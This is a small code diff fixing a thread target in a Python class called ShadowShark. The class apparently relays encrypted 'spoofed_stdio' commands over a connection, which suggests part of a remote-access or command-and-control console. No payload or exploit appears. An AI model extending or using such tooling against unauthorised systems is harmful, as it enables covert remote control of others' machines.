@@ -129,7 +129,7 @@ class ShadowShark:
                     if command.startswith('spoofed_stdio'):
                         if len(command.split()) >= 2:
                             self.connection.send(self.encryption_handler(command, encode=True))
-                            spoofed_stdio_recv_thread = threading.Thread(target=self.recv_stdin, daemon=True)
+                            spoofed_stdio_recv_thread = threading.Thread(target=self.spoofed_stdio_recv, daemon=True)
                             spoofed_stdio_recv_thread.start()
                         else:
                             print('Use spoofed_stdio in the format spoofed_stdio COMMAND.')
